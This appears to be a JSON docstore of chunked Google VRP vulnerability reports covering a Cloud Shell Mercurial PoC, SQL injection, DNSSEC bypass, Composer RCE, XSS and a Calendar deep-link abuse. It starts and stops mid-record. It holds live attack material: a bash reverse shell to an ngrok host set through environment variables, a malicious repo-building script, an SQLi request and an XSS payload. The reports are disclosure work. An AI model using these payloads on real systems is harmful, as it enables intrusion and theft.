repository writes a 'cut' binary to /home/<user>/gopath/bin, the 'cut' command is invoked in cloudshell_open after 'go get' has completed running). Ofcourse any writeable path on the filesystem can be chosen by modifying the evil repository.\r\nBrowser/OS:\r\nLatest Chrome /  Latest OSX\r\nI hope this helps!\r\nKind regards,\r\nOffensi.com\r\nWouter ter Maat\r\nps. Replicating the evil repository can be done like this:\r\n#!/bin/sh\r\n# PoC for Google VRP by wtm@offensi.com\r\nmkdir hgrepo\r\nhg init hgrepo/root\r\ncd hgrepo/root\r\nln -s ../../../bin\r\nhg ci -qAm 'add symlink \"bin\"'\r\nhg init ../../../bin\r\necho 'bin = bin' >> .hgsub\r\nhg ci -qAm 'add subrepo \"bin\"'\r\ncd ../../../bin\r\necho '#!/bin/sh' >> cut\r\necho 'wall You have been pwned!' >> cut\r\nchmod +x cut\r\nhg add cut\r\nhg commit -m \"evil cut bin\"\r\ncd /var/www/html/hgrepo/root\r\nhg commit -m \"final\"\r\n# now create the evil go.html file", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2242, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "4deac1d5-ee44-4a7c-a3f0-396ef522b1f9": {"__data__": {"id_": "4deac1d5-ee44-4a7c-a3f0-396ef522b1f9", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_325985.clean.txt", "file_name": "20250408_175647_325985.clean.txt", "file_type": "text/plain", "file_size": 1759, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "200abcf2-499b-4399-854f-90b45c2d1d8e", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_325985.clean.txt", "file_name": "20250408_175647_325985.clean.txt", "file_type": "text/plain", "file_size": 1759, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "b9665dd6ef9563c8ce78b7874512933f0526913439944e1c7522453a564213c4", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nSQL injection on\r\nhttps://www.pacoapp.com\r\nProduct:\r\nGoogle OSS (open source software)\r\nURL:\r\nhttps://github.com/google/paco\r\nVulnerability type:\r\nSQL Injection (SQLi)\r\nDetails\r\nHello team\r\ni found this sql injection on json\r\ndatabase is pacodb  and version is 5.7.44-google-log\r\nin screen sleep i used sleep() -> see the time in image\r\nPOST /csSearch?pacoProtocol=5 HTTP/2\r\nHost: www.pacoapp.com\r\nCookie: SACSID=~AJKiYcEQQ1KnCajhnZoIoYn1RB6CUlwjNvdoXjnZDIVWSFlQpN7J8SpzkhwyAOMl2zyyRatQWd6dEmszcio8eDPn1BFatpVtb9SFeG3xklB4K-rlq0qbaVFlgr96a0XdsoDj0mfkzLGHHHY6gJy-Rmlx7Aliqsipao1guOvqmuPYpSy88dVNQdoxDq1Q-f_MNw29RkQzkPyuIUEVC5RWAOX_Daggr7hl5gvDeHsoQMnaajRsnKR9Tn_kbhQ9JMrNyqME6WM-s92EYZXaAsLaolw_4bBjh-JtzRzIE_uWO4OaAtTyEiP8QnJ9XKWWEVFUiCeo7j8U7j0-qpipOhHM1GUm3b_PTON2f3DSuleQMco5YeiIOdWyHjm0EFOyX6Ewuj-40umTn5y4FTC8Knd2dL758i_G38pLSQ\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\nAccept: application/json, text/plain, */*\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nPacoprotocol: 4\r\nContent-Type: application/json;charset=utf-8\r\nContent-Length: 165\r\nOrigin: https://www.pacoapp.com\r\nReferer: https://www.pacoapp.com/\r\nSec-Fetch-Dest: empty\r\nSec-Fetch-Mode: cors\r\nSec-Fetch-Site: same-origin\r\nTe: trailers\r\n{\"select\":[\"database()\"],\"query\":{\"criteria\":\"experiment_id = ? and response_time is not null\",\"values\":[4939133602758656]},\"order\":\"response_time desc\",\"limit\":\"1\"}\r\nAttack scenario\r\ncan allow attackers to spoof identity, tamper with existing data, cause repudiation issues such as voiding transactions or changing balances, allow the complete disclosure of all data on the system, destroy the data or make it otherwise unavailable, and become administrators of the database server.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1759, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "4e8ca7df-acb2-4a07-8aef-267fa5a13ec9": {"__data__": {"id_": "4e8ca7df-acb2-4a07-8aef-267fa5a13ec9", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_515431.clean.txt", "file_name": "20250408_175710_515431.clean.txt", "file_type": "text/plain", "file_size": 1592, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "dcedcb07-81eb-48ac-be26-c4306235bcc5", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_515431.clean.txt", "file_name": "20250408_175710_515431.clean.txt", "file_type": "text/plain", "file_size": 1592, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "229844f1dfdf276f442a93f9d8535a722380b0fc09a0f8e952ebe21d443e02b4", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: DNSSEC signed names are vulnerable for cache pollution\r\nSteps to reproduce:\r\nDescribed in:\r\nhttps://issuetracker.google.com/issues/214115031\r\nAttack scenario:\r\nWe discovered a method that appears to circumvent DNSSEC, thus allowing to perform cache pollution even when a domain name is protected with DNSSEC. Instead of returning a SERVFAIL, Google Public DNS returns an (insecure) answer.\r\nReproduction Steps\r\nTake a DNSSEC-signed domain (proof of concept: servfail.nl)\r\nModify the signatures, with bogus signatures\r\nImportant: also change the key tag of the RRSIGs into something else (in the PoC we change 45916 into 45918)\r\nExploitability\r\nSo, what we essentially did is simulate a hacker that by some means (Kaminsky-style perhaps) is able to reply with fake replies and fake RRSIGs. A validating resolver should normally refuse such replies (SERVFAIL). Google Public DNS does indeed do this when\r\nonly\r\nthe RRSIG is fake. But when the RRSIG is modified in such a way that key tag does\r\nalso\r\nnot match. to any present DNSKEY, Google Public DNS returns an (insecure) answer, without the AD-bit set.\r\nHere is the PoC in DNSViz:\r\nhttps://dnsviz.net/d/servfail.nl/Yd05Yw/dnssec/\r\nWe believe it should not be possible to perform cache pollution for DNSSEC-signed domains in the way as described above. Google Public DNS should return a SERVFAIL when the RRSIG is invalid.\r\nScope\r\nThis alleged vulnerability applies to DNSSEC-protected zones\r\nImpact\r\nPotentially significant impact; adversaries can circumvent DNSSEC-protection and theoretically still perform cache pollution attacks", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1592, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "ad8e3bb9-c166-439b-a0d3-77e0d3bcde93": {"__data__": {"id_": "ad8e3bb9-c166-439b-a0d3-77e0d3bcde93", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_426701.clean.txt", "file_name": "20250408_175640_426701.clean.txt", "file_type": "text/plain", "file_size": 2346, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "998f8e67-bbac-431d-b9fb-9051d14942c5", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_426701.clean.txt", "file_name": "20250408_175640_426701.clean.txt", "file_type": "text/plain", "file_size": 2346, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "12006fe106b769ec2bf33559c62b57fcb9d66df3492d7ccc5637a4fc1c2cf538", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nComposer RCE inside dag processor, triggerer, worker and webserver machines\r\nProgram:\r\nGoogle VRP\r\nVulnerability type:\r\nRemote Code Execution (RCE)\r\nDetails\r\nIt's possible to create a composer environment with environment variables such as:\r\nPYTHONWARNINGS=\"all:0:antigravity.x:0:0\"\r\nBROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/19980 0>&1' & #%s\"\r\nThen, all the machines related to the composer environment will use these environment variables. Which will cause that any python execution will trigger a reverse shell.\r\nAttack scenario\r\nAny user with the permission\r\ncomposer.environments.update\r\nwill be able to update the environment variables of a composer environment.\r\nThe attacker will gain access to (at least) 4 composer machines:\r\nDag processor\r\nTriggerer\r\nWorker\r\nWebserver\r\nThese are machines maintained by GCP that, afaik, the user shouldn't be able to access.\r\nWith this access the user will be in complete control of the Composer (Airflow) environment, being able to access and modify the SAL databases, redis, steal the signing keys...\r\nStealing the signing keys the user will be able to maintain persistence over the airflow platform and escalate privileges.\r\nMoreover, accessing these machines it might be possible that the attacker can have access to restricted places. As I wasn't sure if the user was expected to be able to access these machines, my guess was that he isn't, I didn't investigate further where those machines were located.\r\nFinally, a user only having the\r\npermission is going to be able to escalate privileges to the SA attached to the composer environment without needing the actAs permission of the Service Account.\r\nPlease, note that a user with enough permissions to create a composer environment it's also going to be able to access all those machines abusing the environment variables.\r\nIn the attachments of this report it's possible to find a video about how to user the update permission to add the environment variables inside a composer environment and get a shell inside the web server.\r\nAnd then there are 3 more videos showing shells inside the dag processor, triggerer and worker. These are reverse shells that will come by waiting and triggering some dag. At the end composer is made by python and any python execution inside any machine will execute a reverse shell.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2346, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "08c42fda-a4e9-4115-9e15-24ceb5c4d306": {"__data__": {"id_": "08c42fda-a4e9-4115-9e15-24ceb5c4d306", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175651_978034.clean.txt", "file_name": "20250408_175651_978034.clean.txt", "file_type": "text/plain", "file_size": 850, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "6d9f9102-220a-4af6-be46-11a5bc55862e", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175651_978034.clean.txt", "file_name": "20250408_175651_978034.clean.txt", "file_type": "text/plain", "file_size": 850, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "95af5a635141b0ccbfd46ca98d2ad71cf1c377ce8bc15740966a2486d43bdbe9", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nURLs leak in Web Vitals\r\nProduct:\r\nWeb Vitals\r\nURL:\r\nhttps://chrome.google.com/webstore/detail/web-vitals/ahfhijdlegdabablpippeagghigmibma?hl=en\r\nVulnerability type:\r\nSensitive data exposure\r\nDetails\r\nIn the context of the content script on an attacker controlled website.\r\nchrome.storage.local.get(null, results => {\r\nfor (let hash in results) {\r\nconsole.log(results[hash].location);\r\n}\r\n});\r\nAttack scenario\r\nA compromised renderer can leak visited URLs this maybe sensitive for example the url may contain an access_token\r\nGit repo:\r\nhttps://github.com/GoogleChrome/web-vitals-extension/tree/master\r\nWhile I may be wrong this does look to be a Google extension.\r\nhttps://github.com/GoogleChrome/web-vitals-extension/blob/master/CONTRIBUTING.md\r\nDone as part of Grant issue 286169438\r\nhttps://web.dev/debug-cwvs-with-web-vitals-extension/", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 850, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "c95c830e-beca-49ff-8797-9692ad9b9a55": {"__data__": {"id_": "c95c830e-beca-49ff-8797-9692ad9b9a55", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175735_566691.clean.txt", "file_name": "20250408_175735_566691.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "0dc93e74-dfba-4895-bb49-11456d0ce588", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175735_566691.clean.txt", "file_name": "20250408_175735_566691.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "91a5c7a58de0d6e779142d052f3b544f34ea8af991c56a5d798ff36ec9ef352d", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 0, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "bbf64eb9-9eac-4412-b921-18190925ac5b": {"__data__": {"id_": "bbf64eb9-9eac-4412-b921-18190925ac5b", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_657985.clean.txt", "file_name": "20250408_175719_657985.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "04da8b49-a510-491c-a053-2501078bc14e", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_657985.clean.txt", "file_name": "20250408_175719_657985.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "2a1e5108009589896df30f80729d4e597bfdbc0b4169e6614aa1572f1b91e4f7", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 0, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "a5ffed9c-cfb2-460f-8c9d-3c14d076372a": {"__data__": {"id_": "a5ffed9c-cfb2-460f-8c9d-3c14d076372a", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175735_606831.clean.txt", "file_name": "20250408_175735_606831.clean.txt", "file_type": "text/plain", "file_size": 575, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "60331ddf-282c-4bd4-ae68-4dd1451744ec", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175735_606831.clean.txt", "file_name": "20250408_175735_606831.clean.txt", "file_type": "text/plain", "file_size": 575, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "1fad0b157af6ca988d1f274c672d68f827072dea05e1c05c3e63f248bd55402a", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Stored Cross Site Scripting attack\r\nSteps to reproduce:\r\nLogin into kaggle.com\r\ngo to my profile\r\nclick on edit profile\r\nenter \" + alert(document.domain), // payload in display name field and click on save profile.\r\nReload the page and payload will execute.\r\nPlease go through the PoC video to understand the attack\r\nhttps://drive.google.com/file/d/1KQXIuSu1FPDMBQ38NQ9Hj0QmsBVQmuCc/view?usp=sharing\r\nAttack scenario:\r\nwith the help of this attack, an attacker can steal cookies, record keylogs and can also capture screen.\r\nAcquisition info:\r\nhttps://www.kaggle.com", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 575, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "06424996-b1ac-4c0d-b40c-f534091627e1": {"__data__": {"id_": "06424996-b1ac-4c0d-b40c-f534091627e1", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_269950.clean.txt", "file_name": "20250408_175638_269950.clean.txt", "file_type": "text/plain", "file_size": 1466, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "e2c3f840-0027-4087-b626-b5cba276ee36", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_269950.clean.txt", "file_name": "20250408_175638_269950.clean.txt", "file_type": "text/plain", "file_size": 1466, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "b92b1fe869e1e6aa33deefd526ec2a5ed1b1f17180f7590fe5d4cafdfeef5353", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nXSS on\r\nhttps://app.signalpath.com\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nhttps://app.signalpath.com/trialpath/assets/pdfjs/web/viewer.html\r\nVulnerability type:\r\nCross-site scripting (XSS)\r\nDetails\r\nI was asked to create a separate report in\r\nhttps://issuetracker.google.com/u/1/issues/341910000#comment19\r\nThere's a vulnerable version of PDF.js hosted at\r\nthat allows for XSS with a custom file. Its CVE-2024-4367\r\nhttps://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/\r\nThere is a same-origin or blob check for the\r\nfile\r\nURL parameter, However the open file feature results in XSS (it also works by drag and drop)\r\nMay also be a feature in\r\nSite CTMS\r\nto upload a document containing the XSS, for example to gain privilege escalation.\r\nTo make the attack less obvious since\r\napp.signalpath.com\r\nhas no embed protection you can make it look like the file upload is for a unrelated site. (May also be a clickjacking concern if you can get past the 3rd party blocking since there are exceptions but depends on the implementation and browser)\r\nAttack scenario\r\nWhile I cant login to the platform\r\nhttps://app.signalpath.com/\r\nsays \"The files in Verily Viewpoint Site CTMS contain confidential patient information belonging to the sender that is legally privileged\" which unlike some disclaimers about stuff being confidential such as the stuff in\r\nSite CTMS Resources\r\nat\r\nhttps://app.signalpath.com/virtual-visits\r\nthis one seems valid.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1466, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "dbc01a1c-14b5-47cf-bf7e-50cbda74b508": {"__data__": {"id_": "dbc01a1c-14b5-47cf-bf7e-50cbda74b508", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_148155.clean.txt", "file_name": "20250408_175724_148155.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "8ff052df-7d7a-45ed-91ef-768182061d90", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_148155.clean.txt", "file_name": "20250408_175724_148155.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "91ec43fea3ae28b272f79b5407b6ef774a25a5784ee0382657e2a1da9c5560e7", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 0, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "cccc1ed8-662a-47a4-99e3-00c7c507f0a0": {"__data__": {"id_": "cccc1ed8-662a-47a4-99e3-00c7c507f0a0", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_740770.clean.txt", "file_name": "20250408_175649_740770.clean.txt", "file_type": "text/plain", "file_size": 5225, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "c576ce7e-3964-4f1d-9e2b-d0fe49206e29", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_740770.clean.txt", "file_name": "20250408_175649_740770.clean.txt", "file_type": "text/plain", "file_size": 5225, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "4320230e54597671c6699a8ad8f97398b7d284ddd2368b00e06b550ea74e40a2", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "74aeb6fc-3544-4aa2-a2b6-2db9a9123e0f", "node_type": "1", "metadata": {}, "hash": "d832159a11cf49b64541a4ff0db3c7d9b7f22f80d095d6777bece795e7d1fe76", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nBug allows to respond to calendar events without user interaction.\r\nProduct:\r\nGoogle Calendar\r\nURL:\r\nhttps://play.google.com/store/apps/details?id=com.google.android.calendar\r\nVulnerability type:\r\nOther\r\nDetails\r\nFunctionality\r\nIn Google Calendar, we have the ability to add events and share them with others by including their email addresses during event creation in\r\nAdd guests\r\nfield. Once saved, the event is added to the calendars of the individuals it is shared with.\r\nRecipients can then respond to the invitation by accessing their calendar, opening the event, and selecting one of the three available options: Yes, No, or Maybe.\r\nBug Overview\r\nThere is a bug in the Google Calendar's DeepLink handling functionality, which allows any\r\nthird-party app\r\nor\r\na website\r\nto trigger a vulnerable code that sends response to calendar events on behalf of the user.\r\nVulnerable App:\r\ncom.google.android.calendar\r\nVulnerable Activity:\r\ncom.android.calendar.event.LaunchInfoActivity\r\nExploit DeepLink :\r\nhttps://calendar.google.com/calendar/event?eid=\r\n<eid_here>&action=RESPOND&rst=<1,2 or 3>\r\nStructure of eid\r\nThe event in the calendar is identified by a base64 encoded value.\r\nE.g\r\nYzhzNmFwMzQ3MHBqOGJiMmNsajY4YjlrY2NzbWNiOXBjbGhqMmI5bmNrbzMycDlnY2hpbTRkcG1jayBnaG9zdGluZnJpZGF5QG0\r\nOn decoding the value;\r\nc8s6ap3470pj8bb2clj68b9kccsmcb9pclhj2b9ncko32p9gchim4dpmck ghostinfriday@m\r\nThe decoded value consists of 2 parts separated by space.\r\nPart1:\r\nevent_id\r\nPart2:\r\nemail of the user to which this event belongs\r\nGenerating eid\r\nAttacker needs to generate eid of the events that get added into target user's calendar, to build the malicious deepLink that exploits the bug.\r\nFor that purpose, let's assume following data;\r\nAttacker:\r\nattacker@gmail.com\r\ntarget1:\r\ntarget1@gmail.com\r\ntarget2:\r\ntarget2@gmail.com\r\nSteps to get attacker event eid\r\nOpen calendar.google.com, login with\r\nCreate an event; add target1 and target2 as guests and save it.\r\nOpen Developers Tool for the same window using ctrl+shift+i;\r\nbrowse to network tab\r\nchoose only XHR request filter; to ignore rest of the noise\r\nclear previous requests\r\nRefresh the window\r\nSearch for request to\r\n/calendar/u/0/sync.prefetcheventrange\r\nendpoint\r\nLook into the protobuf response; try to look for the\r\ntitle of the event\r\n; above title you will find a url with syntax\r\nhttps://www.google.com/calendar/event?eid=<event_id>\r\nThe\r\neid\r\nthat we get in\r\nstep6\r\nbelongs to the calendar of\r\nattacker\r\n,\r\nSteps to generate target event eid\r\nBase64Decode the eid from step6 ; you will observe the following pattern (ignore the quotes)\r\n\"<unique_id>\"+\"a space\"+\"attacker@m\"\r\nReplace\r\nattacker@m\r\nwith\r\ntarget1@m\r\n\"<unique_id>\"+\"space\"+\"target1@m\"\r\nBase64Encode the above string; to get the\r\nfor\r\ntarget1\r\nFinally we have the\r\nof the events; that's added into the target users calendar.\r\nThis is pre-requisite for bug reproduction.\r\nP.S: steps 1-6 are for chromium based browsers; not sure about safari or firefox.\r\nSteps to Reproduce Bug\r\nPre-requisites\r\nTwo google accounts; consider one as\r\nand other as\r\ntarget\r\nAn android device with calendar installed and logged in with\r\ntarget account\r\nCreate a new event invite in\r\nattacker account\r\nusing calendar web interface at calendar.google.com, add\r\nin\r\nAdd Invite\r\n. Confirm that new event is created in\r\ntarget calendar\r\n, by opening\r\nin android device.\r\nGenerate\r\nTarget's eid\r\n(Refer Generating eid section)\r\nUbuntu machine with adb installed.\r\nTriggering Bug\r\nThere are 2 ways to trigger the bug in target device\r\nBy sending an intent to vulnerable activity\r\nBy sending a malicious link to the target person\r\nUsing Intent\r\nConnect the target android device with ubuntu machine, make sure usb-debugging is enabled.\r\nExecute the following command, replace <target_eid>, with the generated one.\r\nadb shell am start-activity -d 'https://calendar.google.com/calendar/event?eid=<target_eid>&action=RESPOND&rst=2' com.google.android.calendar/com.android.calendar.event.LaunchInfoActivity\r\nYou will notice a toast getting popped up, regarding responding to the event.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 4081, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "74aeb6fc-3544-4aa2-a2b6-2db9a9123e0f": {"__data__": {"id_": "74aeb6fc-3544-4aa2-a2b6-2db9a9123e0f", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_740770.clean.txt", "file_name": "20250408_175649_740770.clean.txt", "file_type": "text/plain", "file_size": 5225, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "c576ce7e-3964-4f1d-9e2b-d0fe49206e29", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_740770.clean.txt", "file_name": "20250408_175649_740770.clean.txt", "file_type": "text/plain", "file_size": 5225, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "4320230e54597671c6699a8ad8f97398b7d284ddd2368b00e06b550ea74e40a2", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "cccc1ed8-662a-47a4-99e3-00c7c507f0a0", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_740770.clean.txt", "file_name": "20250408_175649_740770.clean.txt", "file_type": "text/plain", "file_size": 5225, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "5bbe4f5ef1611abda70aa34ff613e9392e0d618d9b76b0ce0239f7c125a0e1bd", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Confirm that new event is created in\r\ntarget calendar\r\n, by opening\r\nin android device.\r\nGenerate\r\nTarget's eid\r\n(Refer Generating eid section)\r\nUbuntu machine with adb installed.\r\nTriggering Bug\r\nThere are 2 ways to trigger the bug in target device\r\nBy sending an intent to vulnerable activity\r\nBy sending a malicious link to the target person\r\nUsing Intent\r\nConnect the target android device with ubuntu machine, make sure usb-debugging is enabled.\r\nExecute the following command, replace <target_eid>, with the generated one.\r\nadb shell am start-activity -d 